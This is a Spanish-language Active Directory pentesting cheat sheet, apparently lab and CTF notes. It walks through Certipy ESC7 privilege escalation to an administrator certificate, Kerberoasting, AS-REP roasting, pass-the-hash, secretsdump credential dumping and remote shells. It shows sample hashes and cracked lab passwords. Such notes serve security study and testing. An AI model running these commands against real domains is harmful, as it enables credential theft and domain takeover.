# Active Directory Enumeracion


## Hashcat 

🐱🔑 es una herramienta de cracking de contraseñas muy usada en pentesting, forense digital y CTFs.

🔎 ¿Qué es?

* Es un password cracker avanzado que permite romper contraseñas a partir de hashes usando diferentes técnicas y aceleración por GPU (CUDA/OpenCL) para hacerlo mucho más rápido que con CPU.

### ⚙️ Características principales

* Soporta múltiples algoritmos de hash:
* NTLM, MD5, SHA1, SHA256, bcrypt, Kerberos, WPA/WPA2, etc.
* Métodos de ataque:
* Ataque de diccionario → probar palabras de un archivo (rockyou.txt).
* Ataque de fuerza bruta → probar todas las combinaciones posibles.
* Ataques híbridos → combinación de diccionario + reglas de mutación.
* Ataques de máscara → patrones específicos (ej: ?l?l?l?d → tres letras y un número).
* Uso de GPU → puede probar millones de hashes por segundo.
* Cross-platform → funciona en Linux, Windows y macOS.

### Tipo de Hashes

* https://hashcat.net/wiki/doku.php?id=example_hashes


### 📌 Hashcat modos (-m) comunes en Active Directory

| **ID (-m)** | **Algoritmo / Hash**        | **Contexto en AD** |
|-------------|-----------------------------|---------------------|
| **1000**    | NTLM                        | Hashes de contraseñas en SAM / NTDS.dit |
| **5500**    | NetNTLMv1                   | Autenticación NTLMv1 (obsoleto, fácil de crackear) |
| **5600**    | NetNTLMv2                   | Autenticación NTLMv2 (muy común en AD, obtenido con responder, mitm6, etc.) |
| **7500**    | Kerberos 5 AS-REQ Pre-Auth etype 23 | Hashes obtenidos con **AS-REP Roasting** (usuarios sin preauth) |
| **13100**   | Kerberos 5 TGS-REP etype 23 | Hashes obtenidos con **Kerberoasting** (SPN tickets) |
| **18200**   | Kerberos 5 TGS-REP etype 17 | Kerberoasting con cifrado AES128 |
| **19700**   | Kerberos 5 TGS-REP etype 18 | Kerberoasting con cifrado AES256 |
| **15300**   | Kerberos 5 TGS-REP etype 17,23 | Variantes de ataques Kerberos (mixto AES/RC4) |

---

### 🔑 Ejemplos de uso con Hashcat

```bash
1️⃣ NTLM (Hash local o dump de NTDS.dit)

    hashcat -m 1000 -a 0 hashes_ntlm.txt rockyou.txt

2️⃣ NetNTLMv2 (obtenido con responder o mitm6)
    
    hashcat -m 5600 -a 0 hashes_netntlmv2.txt rockyou.txt

3️⃣ AS-REP Roasting (usuarios sin preautenticación Kerberos)

    hashcat -m 7500 -a 0 hashes_asrep.txt rockyou.txt

4️⃣ Kerberoasting (TGS tickets con RC4-HMAC)

    hashcat -m 13100 -a 0 hashes_kerberoast.txt rockyou.txt

5️⃣ Kerberoasting AES128

    hashcat -m 18200 -a 0 hashes_kerberoast_aes128.txt rockyou.txt

6️⃣ Kerberoasting AES256

    hashcat -m 19700 -a 0 hashes_kerberoast_aes256.txt rockyou.txt
```

--- 
# Active Directory Certificate Services (AD CS) 

Usando la herramienta Certipy, que está hecha para pentesters/red teamers y auditores de seguridad.


En Active Directory Certificate Services (AD CS), se definieron varios escenarios de abuso llamados ESC1 a ESC8 (sigla de ESCalation), que describen configuraciones inseguras en una CA o en plantillas de certificados.

🔎 ESC7: ManageCA / ManageCertificates Rights

Definición:
Ocurre cuando un usuario o grupo tiene permisos demasiado amplios sobre la Certificate Authority (CA) en AD CS, en particular:

ManageCA → administrar la CA.

ManageCertificates → aprobar, denegar o emitir solicitudes de certificados.

⚡ ¿Por qué es peligroso?

Un usuario con estos permisos puede:

Habilitar plantillas inseguras (ej. SubCA, User, etc.).

Modificar permisos de enrolamiento en cualquier template.

Emitir certificados manualmente, incluso si no tiene derecho a solicitarlos.

Otorgarse certificados a sí mismo que suplantan a cualquier usuario del dominio (incluido Administrador).

En la práctica: con ESC7 puedes crear un Golden Certificate, que equivale a una llave maestra para hacer impersonation de cualquier cuenta en el dominio.

📘 Ejemplo práctico de lo que hiciste:

Tu usuario svcapp1 tenía el permiso ManageCA sobre la CA mentality-WIN-9FQTT7GPAVK-CA.

Usaste certipy-ad para:

Habilitar la plantilla SubCA.

Solicitar un certificado con la identidad de administrator@mentality.thl.

Forzar la emisión manual de la solicitud.

Resultado: conseguiste un certificado válido como Administrador → escalaste privilegios.


## 🔑 1. Enumeración de la CA y plantillas

```bash
certipy-ad find -u 'svcapp1' -p 'Patito12345' -dc-ip 192.168.56.107 -vulnerable -stdout
```

### 📌 ¿Qué hace?

Se conecta al Domain Controller (-dc-ip) usando las credenciales de svcapp1.

Enumera las Certificate Authorities (CAs) y templates de certificados disponibles en AD CS.

Busca configuraciones inseguras (-vulnerable).

### 👉 Resultado: Encontraste que la cuenta svcapp1 tiene permisos peligrosos (ESC7) sobre la CA → puede administrar o modificar configuraciones críticas.

## 🔑 2. Agregar un officer a la CA
```bash
certipy-ad ca -ca 'mentality-WIN-9FQTT7GPAVK-CA' -add-officer svcapp1 -username svcapp1@mentality.thl -password 'Patito12345'
```

### 📌 ¿Qué hace?

Añade al usuario svcapp1 como CA officer.

Esto le da más poder de administración sobre la autoridad certificadora.

### 🔑 3. Habilitar una plantilla peligrosa
```bash
certipy-ad ca -ca 'mentality-WIN-9FQTT7GPAVK-CA' -enable-template SubCA -username svcapp1@mentality.thl -password 'Patito12345'
```

### 📌 ¿Qué hace?

Activa el template SubCA.

Los templates definen quién puede solicitar qué tipo de certificado.

SubCA es muy peligroso, porque permite crear certificados de subordinadas CA, que básicamente pueden emitir certificados falsos para cualquier usuario (incluso Administrador).

## 🔑 4. Solicitar un certificado para impersonar al Administrador
```bash
certipy-ad req -ca 'mentality-WIN-9FQTT7GPAVK-CA' -template SubCA -username svcapp1@mentality.thl -password 'Patito12345' -upn administrator@mentality.thl
```

### 📌 ¿Qué hace?

Envía una solicitud de certificado a la CA, usando el template SubCA.

El -upn administrator@mentality.thl indica que el certificado debe ser emitido con la identidad del usuario Administrator.

Esto es el núcleo de la vulnerabilidad: logras un golden certificate para el administrador.

## 🔑 5. Forzar la emisión del certificado
```bash
certipy-ad ca -ca 'mentality-WIN-9FQTT7GPAVK-CA' -issue-request 5 -username svcapp1@mentality.thl -password 'Patito12345'
```

### 📌 ¿Qué hace?

Como svcapp1 tiene permisos administrativos sobre la CA, fuerza que la solicitud ID 5 (que pediste antes) sea emitida, aunque no tuviera permisos de enrolamiento.

## 🔑 6. Recuperar el certificado emitido
```bash
certipy-ad req -ca 'mentality-WIN-9FQTT7GPAVK-CA' -u 'svcapp1@mentality.thl' -p 'Patito12345' -target 'WIN-9FQTT7GPAVK.mentality.thl' -ns 192.168.56.107 -retrieve '5'
```

### 📌 ¿Qué hace?

Descarga el certificado emitido (ID 5).

Lo guarda junto con la clave privada en un archivo administrator.pfx.

Ese PFX es un certificado válido para el usuario Administrador.

## 🔑 7. Autenticarse con el certificado
certipy-ad auth -pfx administrator.pfx -dc-ip 192.168.56.107


### 📌 ¿Qué hace?

Usa el certificado de administrator.pfx para obtener un TGT Kerberos válido como el Administrador.

También extrae el NT hash del administrador (058a4c99bab8b3d04a6bd959f95ce2b2).

👉 En este punto, ya tienes credenciales reutilizables para cualquier acceso.

🔑 8. Conexión final con Evil-WinRM
```bash
evil-winrm -i 192.168.56.107 -u administrator -H 058a4c99bab8b3d04a6bd959f95ce2b2
```

📌 ¿Qué hace?

Usas el hash NTLM del administrador para abrir una sesión remota PowerShell (WinRM).

Esto te da una shell de administrador en el servidor Windows.

De ahí lees la root_flag.txt.

📘 ¿Para qué se usa todo esto?

- Certipy → Herramienta para enumerar, explotar y abusar de Active Directory Certificate Services (AD CS).

- AD CS → Infraestructura de certificados en Windows que, si está mal configurada, permite ataques como:

- ESC1–ESC8 → Diferentes escenarios de abuso de plantillas y permisos.

- Golden Certificates → Emitir un certificado válido para cualquier usuario (incluido Administrador).

- Persistencia → Como los certificados pueden durar años, se mantiene acceso incluso si cambian contraseñas.

- evil-winrm → Herramienta de post-explotación para acceder vía WinRM con credenciales o hashes.


---

# 🔎 smbmap

Es una herramienta de pentesting para enumerar recursos compartidos SMB en redes Windows/Active Directory.
Se centra en descubrir, listar y probar permisos en los shares SMB de los hosts.

## 🔹 Qué hace smbmap
- Lista recursos compartidos (shares) disponibles en un host o red.
- Muestra permisos de lectura/escritura/ejecución para cada share.
- Permite descargar o subir archivos si tienes permisos.
- Ayuda a identificar malas configuraciones de SMB y posibles vectores de escalamiento de privilegios.

## 🔹 Uso básico
* Enumerar shares en un host
    * -H → Host o IP del objetivo
    * -u → Usuario para autenticarse
    * -p → Contraseña
```bash
smbmap -H 10.10.10.5 -u user -p 'Password123'
```


- Listar de forma recursiva -r → Ruta del share a inspeccionar (ej: '' para raíz)
```bash
smbmap -H 10.10.10.5 -u user -p 'Password123' -r ''
```

* Descargar un archivo
```bash
smbmap -H 10.10.10.5 -u user -p 'Password123' -r 'secret.txt' --download
```
* Subir un archivo
```bash
smbmap -H 10.10.10.5 -u user -p 'Password123' -r 'share_folder' --upload localfile.txt
```

---

# NetExec (nxc),
Es el fork y sucesor de CrackMapExec (CME).

* Se usa en pentesting de Active Directory para interactuar con servicios SMB, WinRM, LDAP, MSSQL, RDP, etc.

Cuando ejecutas:
```bash
netexec smb
```
* Estás diciendo: usa el módulo SMB de NetExec.

    * El módulo SMB permite:
    * Enumerar hosts (saber si tienen SMB abierto, versión, dominio, etc.).
    * Autenticar usuarios/contraseñas contra SMB.
    * Lanzar ataques de tipo “pass-the-hash” o “pass-the-ticket”.
    * Ejecutar comandos remotamente si tienes credenciales válidas.

Listar shares (recursos compartidos) en un host.

🔑 Ejemplos prácticos

Descubrir info básica de un host
* netexec smb 10.10.10.5

Muestra sistema operativo, dominio, versión de SMB, etc.

Probar credenciales

* netexec smb 10.10.10.5 -u admin -p 'Password123'

### Ejemplo 

```bash
netexec  smb 10.200.150.20  -u John -p 'VerySafePassword!' 
```
Salida del comando
```bash
SMB         10.200.150.20   445    WRK              [*] Windows 10 / Server 2019 Build 17763 x64 (name:WRK) (domain:tryhackme.loc) (signing:False) (SMBv1:False) 
SMB         10.200.150.20   445    WRK              [+] tryhackme.loc\John:VerySafePassword! 
```

Pass-the-Hash

* netexec smb 10.10.10.5 -u admin -H aad3b435b51404eeaad3b435b51404ee:a0f3ae0237d82a4c8f0734ffb173ad92

Listar recursos compartidos (shares)

* netexec smb 10.10.10.5 -u admin -p 'Password123' --shares

Ejecución remota de comandos (si tienes permisos)

* netexec smb 10.10.10.5 -u admin -p 'Password123' -x "whoami"


## El módulo WinRM (Windows Remote Management)

Es un servicio de administración remota de Windows basado en HTTP/HTTPS (puertos 5985 y 5986).

Verifica si le usuario pertenece al grupo de Remote Manager Users para obnter una consola interactiva.

En un entorno Active Directory, se usa mucho para ejecutar comandos de forma remota en máquinas Windows, siempre que tengas credenciales válidas y el usuario tenga permisos de WinRM.
```bash
netexec winrm -i 10.200.150.20 -u John -p VerySafePassword!
```

**Si en la repuesta nos sale Pw3d! nos podremos conectar al servicio**

```bash
evil-winrm -i 10.200.150.20 -u John -p VerySafePassword!
```
**Conecatarse mediante el Hash del Usuario**
```bash
 evilwinrm -i 10.200.20 -u administrator -H '7588e253753ab8b09c99a3d8f58b0b9d'
```
---

# 1️⃣ Smbclient

* Herramienta incluida en Samba para acceder a recursos compartidos de Windows (SMB/CIFS).
* Funciona como un cliente FTP para SMB: permite listar, subir, descargar archivos y conectarse a shares de red.

    * -L   lista todos los shares disponibles
    * -N   Sin contraseña (anónimo)

🔹 Privilegios necesarios

Depende del share:

* Público → no se requieren credenciales.
* Restringido → usuario válido en el dominio o máquina.


### Uso básico

* Conectar a un share público

### Ejemplo Conexión anónima
```bash
smbclient -L //10.10.10.20 -N
```
* Lista los recusos compartido
```bash
   Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Safe            Disk      
```

### Ejemplo Conexión anónima

* //IP/ShareName → recurso compartido de Windows

-U usuario → nombre de usuario (te pedirá contraseña)
```bash
smbclient \\\\10.200.150.10\\Safe -U j.phillips%Welcome1
```



## PODEMOS IR A LA CARPETA DE KALI E IR A ESTA RUTA
```bash
smb://10.10.10.20/Safe/
```
**Agregar el usuario y clave svc-admin%management2005  .**

* se nos abre la ruta Seleccionada



---


## 🔎 ¿Qué es rpcclient

Herramienta incluida en Samba para interactuar con el RPC (Remote Procedure Call) de Windows.

Permite realizar enumeración avanzada de usuarios, grupos y recursos, sin necesidad de conectarse a shares.

Para muchas operaciones de enumeración no se requiere privilegio elevado, basta con un usuario válido o incluso conexión anónima para algunos datos.

Usa rpcclient cuando necesites enumerar usuarios, grupos o permisos antes de intentar ataques de Kerberoasting, Kerbrute o password spraying.

## Ejemplos  Conectar a un host de forma Anonima
```bash
rpcclient -U "" 10.10.10.20 -N
```


## Ejemplos  Conectar a un host con Credenciales
```bash
rpcclient -U 'John%VerySafePassword!' 10.200.150.10 
```
* Con el comando enumdomusers podemos listar los usuario del DOMINIO
```bash
    enumdomusers 
```
* Ejemplo de Salida
```bash
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Machine2] rid:[0x450]
user:[Admin1] rid:[0x451]
user:[Admin2] rid:[0x452]
user:[User1] rid:[0x453]
```

### Obtener los nombres de los Usuarios
* Gurdar los usuarios en un arhivo
```bash
rpcclient -U 'Administrator%P@$$W0rd'  10.201.3.6     >  userK.txt
```

* Extrae solo los nombres de los Usuarios
```bash
cat userK.txt | grep -oP '\[.*?\]' | grep -v "0x" | tr -d '[]' | sponge userK.txt 
```

```bash
cat userK.txt | grep -oP '(?<=\[).*?(?=\])' | grep -v "0x" > usuarios_limpios.txt
```


* Salida de los usuario
```bash
Administrator
Guest
krbtgt
t1_n.marsh
t1_j.hutchinson
t2_m.taylor
```

* Con el comando enumdomusers podemos listar los grupos del DOMINIO
```bash
    enumdomgroups
```
* Ejemplo de Salida
```bash
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
```

* Con el comando querygroupmem 0x200 podemos listar los usuario que forman del grupo Selecionado
* Grupo administradores -> 0x200
```bash
rpcclient $> querygroupmem 0x200
        rid:[0x1f4] attr:[0x7]
        rid:[0x48b] attr:[0x7]
```

* Con el comando queryuser 0x48b podemos listar la informacion de un usuario
```bash
rpcclient $> queryuser 0x48b
        User Name   :   g.duncan
        Full Name   :   Gareth Duncan
rpcclient $> 
```


* Con el comando querydispinfo  listar la informacion todos los Usuarios
```bash
rpcclient $> querydispinfo
```

---

## 🔎 Craquear Constreñas 

```bash netexec smb 192.168.69.69 -u usuarios.txt -p ah.txt --continue-on-success | grep "+"


SMB                      192.168.69.69   445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Whisky:MamasoyStream2er@ 
```  


## 🔎 AS-REP Roasting

Si una cuenta en AD no requiere preautenticación Kerberos, cualquiera puede solicitar un AS-REP (Authentication Service Response).

- Va tratar de obtener un TGT (Ticket Granting Ticket).
- Se crackea offline, similar al Kerberoasting.
- Diferencia: no necesita pedir TGS, basta con que el usuario tenga DONT_REQ_PREAUTH activado.

## 📌 Definición
Ataque que explota la configuración **"No requiere autenticación previa"** en Kerberos (Active Directory) para obtener hashes de contraseñas.

## 🔍 Mecanismo de Ataque

* Se debe Tener una Lista de Usuarios. que valida quienes puede existir en el Dominio

## Formato del Ataque con impacket

```bash
GetNPUsers.py -dc-ip <Target_IP> <Target_Domain>/ -no-pass -usersfile <the_selected_users_list>
```

### Ejemplo

* Proxychain y Impacket Esto devuelve los SPN y los hashes crackeables.:
```bash
proxychains4  impacket-GetNPUsers  -usersfile /home/kali/Downloads/kerberos/userK.txt -no-pass CONTROLLER.local/
```

* Impacket GetNPUsers:

```bash
impacket-GetNPUsers -usersfile uservalid.txt -no-pass spookysec.local/ 
```

#### Se obtine el hash para el usuario asrepuser1@TRYHACKME.LOC

$krb5asrep$23$asrepuser1@TRYHACKME.LOC:668c316eb42243f5da0bbb2098c5f4b1$1e4e04a64f50c8b8aed7ca2bd6cf8ca3a37ea5fe2ee46392f40bb943851b6d93eace155858a86c526d27cc1fa63e6bb3bf4b86be07a24cbe40f39c11351e9e2d58dcde9147442917f89d96c0ab30358ad28372f5e160dce3b6a2415a0cad8ebdbf4c161de344b091de50760f17935c50912d8107b4520f522fe94a9040cdabaa49367d4d5564e45880c9f3cdac1018ff7007790e70d8a9e66a6cc2e1532eeaccb6d129888abcb2764cf795a7b3bb79c852d8f157a18ad2d24653900dce7d2527acc129bb89190cef964aafc8f9c8c2b2017ccb5b70a14d29cd194686ddae98f72442a6e8f76ab64c33f5097fa71b





### Se Intentar crackear los hashes

* Con los hashes, se pueden intentar ataques de fuerza bruta o diccionario usando herramientas como:
    * john (John the Ripper)
    * hashcat
* Se guarda el hash obnenido en el archivo hashjphillis.txt
```bash
hashcat -m 18200 hashAC.txt /usr/share/wordlists/rockyou.txt 
```
* La constrasena obtenida para el usuario  asrepuser1 : qwerty123!

---


# 🔎 ¿Qué es Kerberoasting?

Es un ataque que abusa de cómo funciona el protocolo Kerberos (puerto 88) en Windows/AD.
La idea es solicitar tickets de servicio (TGS) cifrados con la contraseña de la cuenta de servicio y luego crackearlos offline para obtener la contraseña en texto claro.

* Kerberoasting = pedir tickets Kerberos de cuentas de servicio → crackear offline → obtener contraseña en texto claro.
* **Necesita ser un usuario autenticado en el dominio (no hace falta ser admin)**
### ⚙️ Cómo funciona paso a paso

1. 🔍 El atacante ya tiene acceso a la red
    * Necesita ser un usuario autenticado en el dominio (no hace falta ser admin).
    * El atacante no genera ruido en la red (el cracking se hace offline).
    * Una vez que consigue la contraseña → acceso directo a recursos críticos.
2. 🎫 Solicitud de ticket Kerberos (TGS)
    * El atacante pide un TGS (Ticket Granting Service) para un SPN (Service Principal Name) de una cuenta de servicio en AD.
    * Ejemplo: una cuenta de servicio para SQL Server, IIS, Exchange, etc.
3. 🔐 El TGS viene cifrado
    * El TGS está cifrado con el hash de la contraseña de la cuenta de servicio (NTLM hash de la cuenta asociada al SPN).
4. 📥 El atacante guarda el TGS (hash)
    * Como es un usuario legítimo, recibe el ticket sin problema.
    * No necesita explotar nada todavía.
5. ⚡ Cracking offline
    * El atacante extrae el TGS y lo guarda en formato crackeable (ej. $krb5tgs$...).
    * Luego usa herramientas como Hashcat o John the Ripper para intentar romper el hash y obtener la contraseña en texto claro.

### 🛠️ Herramientas comunes

* Impacket → GetUserSPNs.py (muy usado en pentesting/red teaming).
* Rubeus (Windows).
* Mimikatz.
* Hashcat/John para crackear los hashes.


### Ejemplo

* Proxychain y Impacket Esto devuelve los SPN y los hashes crackeables.:
```bash
proxychains4 impacket-GetUserSPNs tryhackme.loc/John:VerySafePassword! -request
```
* Con Impacket Esto devuelve los SPN y los hashes crackeables.:
    * Se debe tener un Usuario y su contraseña

```bash
impacket-GetUserSPNs tryhackme.loc/John:VerySafePassword!
```

```bash
impacket-GetUserSPNs tryhackme.loc/John:VerySafePassword! -request
```

#### Se obtine el hash para el usuario j.phillips

$krb5tgs$23$*j.phillips$TRYHACKME.LOC$tryhackme.loc/j.phillips*$cae688bbe754e76dbc01b3934b1581e5$ef4150cb3da787af1fc09aa1060852f2e82c4870d7d30e2b2c119d3ba112c952fcc7feb96fd0a15bfc260583768aab211d9e7a99d1c9c80bd23d9f82a53a987d6b1396fcee549f03619067635f97b55126d174411cff93727f82280e1207b9733b925ac1c60606bbf90d9e99c38a0ed0ff94378cb86225774be928817a7ac3362e140a795f356e103963b67151d2ccf646fb4c461884f6024f9ffe4363bf1dd79b742611ff648eb0721cff1d9324367082f5f3c01a25fc4ebb0f052b495bbf249b63143f2b05af9ffa2626c771b298bc57392a93e2a9e95df3085d4e9c591522b4aab32b1ae9b6b8670e95c79d970cb5f91643a60f1dc7782ac2a735ddf0a95d08a43690c52345a7e0cf97c93247146a159301807903b0224b01d45d116550f54444622e7fceba2f00dfc3ef9de65c132497ee0944be7276f88c650216dd33037013191eee29a7e16afa97ee7c5f79400dc8d49b42df5d5c5f194060abe7954651e509be6bad35a4eed728867d2d126fbdc6586b5e3fcff05680104729b0c62642bb499a169ccc6e326f057aa991f1455770162405206550363a0e9e582fbd38a60e7a32134a50a3632c4755abbc76972c6914771819ca5d5951a663b5eda80b285a34725b6cb3b3f253269ab2d79a7d771b457af27de06bf77c9214138ddaa144560810f9709a2b02790156f7f959135e78812b3f6942c60bead154c5b1a3dbcc64a9a398f42c6e6b993e630eb852d573222a7fba71956be9e7a4de29b7bde39827714910359443b582c93c5d1d9110b5b2e26ca550e4b4043e4a25dba5749b85a7429800159442fd7f79804ce329623449965fdf0ece0278c5195c359e927e199981caf018701ab9a74abda0e82e9712751b26787b15e18e00e16590ae6cdb918dac617414f2f83e294508c915a7958d14ced15cbe058fb6e2712b53c17ada37e4300f8121fd220f28015cbf9145273bd296ba351dc668c28e62701fe3eb44373708a1646461b2ab873465b0e7d5b0cb9c5d8966eb28310734c1839def0023fb4c04193c2381baaca72ddddb40bd43b446552618c0d158ef807f8b14df7ebc53f7529230e85f4460b9250eb914ebbbe2024436308545b7baa5c456ec6dce51e92d0d54bcc88de6ebbbe95951ffea966b0c44b8ac0f2954c60acef01f7759d3b669efddb3e987af7de933c82157af8eebf52cf2c54ed1c08dee500f644dac2245460df94004f0b40ea1f342571e9ba6c162d9e8d3f1652689debe1383abb6ed008da7b9ab5085c35ae40114cae092ac51810ab1ba5fc3900b4fea178308d2be467a0a87e92f47



### Se Intentar crackear los hashes

* Con los hashes, se pueden intentar ataques de fuerza bruta o diccionario usando herramientas como:
    * john (John the Ripper)
    * hashcat
* Se guarda el hash obnenido en el archivo hashjphillis.txt
```bash
hashcat -m 13100 -a 0 hashjphillis.txt /usr/share/wordlists/rockyou.txt 
```
* La constrasena obtenida para el usuario  j.phillips:Welcome1

---
# 🔎 ¿Qué es ldapdomaindump?

Es un dumping tool que conecta al LDAP de Active Directory (puerto 389 o 636 si es LDAPS).

Permite obtener un mapa detallado del dominio: usuarios, grupos, equipos, políticas, trusts, OU’s, etc.

Se parece a lo que hace BloodHound, pero en versión offline y en HTML/JSON.

Fue diseñado para usarse junto a ldap3 (lib de Python para LDAP).


## 📌 Uso Básico
```bash
ldapdomaindump -u 'DOMAIN\user' -p 'Password123!' 10.10.10.5
```
- u → Usuario válido del dominio.
- p → Contraseña.
- IP/Hostname → Controlador de dominio.


## 🔥 Ejemplo práctico
* Enumerar usuarios y grupos con credenciales válidas:
```bash
ldapdomaindump -u "corp.local\pentester" -p "Winter2025!" 192.168.1.10
```
* Usando hashes (Pass-the-Hash):
```bash
ldapdomaindump -u "corp.local\pentester" -H aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889 192.168.1.10
```


## 📂 Archivos generados
-  Cuando corres la herramienta, genera tres formatos de salida:
-  JSON → datos estruct urados (para procesar con scripts).
-  CSV → fácil de abrir en Excel.
-  HTML → reportes navegables (muy visual).

* Ejemplo de outputs:
    * domain_users.html → lista de usuarios con atributos (pwdLastSet, lastLogon, etc.).
    * domain_computers.html → equipos unidos al dominio.
    * domain_groups.html → todos los grupos y sus miembros.
    * domain_trusts.html → relaciones de confianza entre dominios.

---



# 🔎 **impacket-secretsdump** 

Es una herramienta de la suite Impacket muy utilizada en pentesting de Active Directory y entornos Windows. 😎

Se centra en extraer credenciales y hashes de cuentas de Windows/AD sin necesidad de explotar vulnerabilidades complejas, siempre que tengas acceso autenticado.

## 🔹 Qué hace secretsdump

* Extrae hashes NTLM de cuentas de usuario y administrador desde:
* Archivos SAM + SYSTEM (local en la máquina objetivo).
* LSASS si tienes acceso remoto.
* Controladores de dominio para volcar hashes de usuarios de dominio.
* Permite obtener hashes de contraseñas, incluyendo cuentas de dominio (krbtgt) para Golden Tickets.

### También puede extraer tickets Kerberos si se combina con otras técnicas.

🔹 Uso básico
1. Local (desde SAM/SYSTEM)
```bash
impacket-secretsdump -sam sam-reg -system system-reg LOCAL  
```

Extrae los hashes de las cuentas locales de Windows desde los archivos SAM y SYSTEM.

2. Remoto con credenciales
```bash
impacket-secretsdump 'DOMAIN\User:Password@10.10.10.5'
```

```bash
impacket-secretsdump administrator.local/miki:Patito.12345%192.168.100.1
```

3. Extrae hashes NTLM de usuarios del dominio y de la máquina remota.

* Ejemplo de Salida
```bash
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2dfe3378335d43f9764e581b856a662a:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:58f8e0214224aebc2c5f82fb7cb47ca1:::
evader:1022:aad3b435b51404eeaad3b435b51404ee:09de49072c2f43db1d7d8df21486bc73:::
user:1023:aad3b435b51404eeaad3b435b51404ee:6de00c52dbabb0e95c074e3006fcf36e:::
[*] Cleaning up... 
```

4. Remoto usando Pass-the-Hash
```bash
evil-winrm -i 10.201.71.91 -u Administrator -H 2dfe3378335d43f9764e581b856a662a
```
---
                      

# 🔎 ¿Qué es BloodHound?

BloodHound es una herramienta de mapeo y análisis de relaciones en Active Directory.
Sirve para identificar caminos de escalada de privilegios y rutas para llegar a Domain Admin o Enterprise Admin.

Usa grafos para mostrar cómo las cuentas, grupos, equipos y permisos se relacionan entre sí, y permite descubrir:

* Caminos de ataque → cómo una cuenta normal puede escalar hasta ser Administrador de Dominio.
* Delegaciones peligrosas (Unconstrained/Constrained Delegation).
* Usuarios con privilegios de RDP, WMI o PSRemoting.
* Grupos con permisos para modificar otros usuarios o GPOs.
* ACLs mal configuradas que permiten “tomar control” de objetos.

## ⚙ Componentes principales

* Ingestores (SharpHound, BloodHound.py) → recolectan datos del dominio.
* Base de datos Neo4j → almacena la información.
* Interfaz BloodHound (GUI) → visualiza y analiza los datos como grafos.



## Install BloodHound CE
```bash
wget https://github.com/SpecterOps/bloodhound-cli/releases/latest/download/bloodhound-cli-linux-amd64.tar.gz
```
```bash
tar -xvzf bloodhound-cli-linux-amd64.tar.gz
```
```bash
./bloodhound-cli install
```

* If you lose the password, you can reset it locally using BloodHound CLI:

```bash
./bloodhound-cli resetpwd
```

## Extraer Informacion
```bash
bloodhound-python -u 'usuario' -p 'Password123!' -d 'DOMINIO.local' -dc DC.DOMINIO.local -c All --zip
```
```bash
bloodhound-python -u 'usuario' -p 'Password123!' -d DOMINIO.local -ns 192.168.100.2 -c All --zip
```
```bash
proxychains4 bloodhound-python -u 'john' -p 'VerySafePassword!' -d tryhackme.loc -ns 10.200.150.10 -c All --zip
```


* Configurar la hora de tu maquina con la maquina victima
```bash
ntpdate 192.168.100.2
```

---

# 🔐 ¿Qué es Kerbrute?

Kerbrute es una herramienta de Go que permite realizar ataques de fuerza bruta y enumeración de usuarios en el protocolo Kerberos de Active Directory.
Se utiliza principalmente para:

* Enumerar usuarios válidos en un dominio.
* Intentar contraseñas para usuarios específicos mediante ataques de fuerza bruta o diccionario.
* Detectar cuentas con contraseñas débiles sin necesidad de privilegios elevados.

Lo interesante de Kerbrute es que no requiere autenticación previa, solo acceso a un controlador de dominio y al puerto Kerberos (88/UDP).

🛠 Instalación de Kerbrute

1. Descargar el Binario Segun tu S.O. 
    - https://github.com/ropnop/kerbrute/releases

2. Cambiamos de nombre al binario kerbrute_linux_amd64 to kerbrute
    -  rename kerbrute_linux_amd64 kerbrute

3. Asignamos permisos de Ejecucion 
    - chmod +x kerbrute

4. Movemos el binario a la carpeta de binarios
    - sudo mv kerbrute /usr/local/bin


---



certipy-ad find -u 'svcapp1' -p 'Hola1234$' -dc-ip 10.0.2.6 -vulnerable -stdout


---

# 🛡️ Ataques a Active Directory (AD) - Cuentas de Servicio

| Ataque                       | Desde dónde se ejecuta                  | Herramienta(s) & Descripción                                                                                   | Objetivo / Qué roba                                           |
|-------------------------------|----------------------------------------|----------------------------------------------------------------------------------------------------------------|---------------------------------------------------------------|
| 🔑 Kerberoasting               | Windows (host comprometido)            | **Rubeus**: Tool para manipular tickets Kerberos. <br>**Mimikatz**: Post-explotación para extraer TGS.       | Extraer TGS de cuentas de servicio para crackear offline     |
| 🔑 Kerberoasting               | Linux (atacante externo)               | **Impacket (GetUserSPNs.py)**: Enumera SPN y solicita tickets TGS.                                            | Solicitar TGS de cuentas de servicio y crackear offline      |
| 🛡️ AS-REP Roasting            | Windows                                | **Rubeus**: Extrae TGT de cuentas sin preautenticación. <br>**Mimikatz**: También permite extraer TGT.        | Obtener hashes de cuentas sin preautenticación               |
| 🛡️ AS-REP Roasting            | Linux                                  | **Impacket (GetNPUsers.py)**: Solicita TGT de cuentas sin preautenticación.                                    | Obtener hashes de cuentas sin preautenticación               |
| ⚡ DCSync                      | Windows                                | **Mimikatz**: Simula un Domain Controller y extrae hashes de usuarios, incluyendo krbtgt.                     | Obtener hashes de usuarios desde DC                          |
| ⚡ DCSync                      | Linux                                  | **Impacket (secretsdump.py)**: Extrae hashes de usuarios y contraseñas desde DC remoto.                        | Obtener hashes de usuarios desde DC remoto                   |
| 🔐 Overpass-the-Hash           | Windows                                | **Rubeus / Mimikatz**: Usa hash NTLM para solicitar tickets Kerberos sin contraseña.                           | Autenticación con hash NTLM / Kerberos                        |
| 🎫 Silver Ticket               | Windows                                | **Mimikatz**: Forja TGS para un servicio usando hash NTLM de la cuenta de servicio.                            | Acceso directo a servicios específicos                       |
| 🎟️ Pass-the-Ticket (PTT)      | Windows                                | **Mimikatz / Rubeus**: Reutiliza tickets Kerberos robados en memoria.                                         | Acceso a servicios o máquinas sin necesidad de contraseña   |
| 🔑 Pass-the-Hash / Remote Exec | Linux                                  | **Impacket (psexec.py, wmiexec.py, smbexec.py)**: Ejecuta comandos remotamente usando hash NTLM.               | Autenticación remota con hash NTLM                           |
